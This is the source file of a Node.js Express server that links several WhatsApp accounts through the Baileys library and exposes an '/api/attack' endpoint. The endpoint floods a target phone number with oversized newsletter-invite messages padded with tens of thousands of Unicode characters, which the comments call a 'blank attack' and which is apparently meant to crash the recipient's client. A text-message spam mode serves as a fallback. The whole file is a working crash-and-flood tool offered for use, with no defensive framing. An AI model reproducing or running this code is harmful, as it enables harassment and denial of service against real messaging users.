const express = require('express');
const http = require('http');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@ostyado/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const os = require('os');

const app = express();
const server = http.createServer(app);

app.use(express.json());
app.use(express.static('public'));

let activeSockets = new Map();

// Function to get router/local IP address
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.internal === false && iface.family === 'IPv4') {
                return iface.address;
            }
        }
    }
    return 'localhost';
}

function cleanNumber(num) {
    let clean = num.toString().replace(/\D/g, '');
    if (clean.startsWith('0')) clean = '62' + clean.substring(1);
    if (!clean.startsWith('62')) clean = '62' + clean;
    return clean;
}

// Fungsi blank dengan newsletter attack
async function blank(target, sock) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "XxX" + "ោ៝".repeat(10000),
            caption: "XxX" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
            inviteExpiration: "999999999",
        },
    };

    try {
        await sock.relayMessage(target, msg, {
            participant: { jid: target },
            messageId: null,
        });
        return true;
    } catch (error) {
        console.log(`❌ Blank attack error: ${error.message}`);
        return false;
    }
}

// Fungsi untuk menjalankan blank attack berulang
async function runBlankAttack(target, sock, count = 5) {
    let successCount = 0;
    for (let i = 0; i < count; i++) {
        const success = await blank(target, sock);
        if (success) successCount++;
        await new Promise(r => setTimeout(r, 5));
    }
    return successCount;
}

async function createBotForSender(senderNumber) {
    if (activeSockets.has(senderNumber)) {
        return activeSockets.get(senderNumber);
    }

    const sessionDir = path.join(__dirname, `session_${senderNumber}`);
    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 10000
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
            console.log(`✅ Bot connected for ${senderNumber}`);
            activeSockets.set(senderNumber, sock);
        }

        if (connection === "close") {
            console.log(`❌ Bot disconnected for ${senderNumber}`);
            activeSockets.delete(senderNumber);
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                setTimeout(() => createBotForSender(senderNumber), 5000);
            }
        }
    });

    return sock;
}

// API Routes
app.post('/api/pairing', async (req, res) => {
    const { phoneNumber } = req.body;

    if (!phoneNumber) {
        return res.json({ success: false, error: "Nomor tidak boleh kosong" });
    }

    try {
        let cleanNum = cleanNumber(phoneNumber);
        console.log(`📱 Request pairing for: ${cleanNum}`);

        const sock = await createBotForSender(cleanNum);

        // Tunggu koneksi terbuka
        await new Promise((resolve) => {
            const checkConnection = (update) => {
                if (update.connection === "open") {
                    sock.ev.off("connection.update", checkConnection);
                    resolve();
                }
            };
            sock.ev.on("connection.update", checkConnection);
            setTimeout(resolve, 10000);
        });

        const code = await sock.requestPairingCode(cleanNum);
        console.log(`🔑 Pairing code for ${cleanNum}: ${code}`);

        res.json({ success: true, code: code });

    } catch (error) {
        console.log(`❌ Pairing error: ${error.message}`);
        res.json({ success: false, error: error.message });
    }
});

app.post('/api/attack', async (req, res) => {
    const { targetNumber, messageCount, senders, attackType = "blank" } = req.body;

    if (!senders || senders.length === 0) {
        return res.json({ success: false, error: "Tidak ada sender" });
    }

    let cleanTarget = cleanNumber(targetNumber);
    const targetJid = cleanTarget + "@s.whatsapp.net";
    let totalSent = 0;
    let successCount = 0;

    for (const sender of senders) {
        const sock = activeSockets.get(sender);
        if (!sock) {
            console.log(`No socket for sender: ${sender}`);
            continue;
        }

        try {
            let sent;
            if (attackType === "blank") {
                sent = await runBlankAttack(targetJid, sock, messageCount);
            } else {
                // Fallback ke text attack jika diperlukan
                sent = messageCount;
                for (let i = 0; i < messageCount; i++) {
                    await sock.sendMessage(targetJid, { text: "X" });
                }
            }
            
            totalSent += sent;
            successCount++;
            console.log(`✅ Attack from ${sender}: ${sent} messages sent using ${attackType} attack`);
        } catch (error) {
            console.log(`❌ Attack failed for ${sender}: ${error.message}`);
        }
    }

    res.json({
        success: true,
        totalSent: totalSent,
        sendersUsed: successCount,
        attackType: attackType
    });
});

app.get('/api/status', (req, res) => {
    const activeList = Array.from(activeSockets.keys());
    res.json({
        activeSenders: activeList.length,
        senders: activeList
    });
});

app.post('/api/remove-sender', async (req, res) => {
    const { phoneNumber } = req.body;
    const sock = activeSockets.get(phoneNumber);
    if (sock) {
        try {
            await sock.logout();
        } catch(e) {}
        activeSockets.delete(phoneNumber);
    }
    res.json({ success: true });
});

// Get router IP address
const LOCAL_IP = getLocalIP();
const PORT = process.env.PORT || 8080;

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on:`);
    console.log(`   - http://localhost:${PORT}`);
    console.log(`   - http://${LOCAL_IP}:${PORT}`);
    console.log(`\n📱 Gunakan IP ini untuk akses dari perangkat lain:`);
    console.log(`   ${LOCAL_IP}`);
});
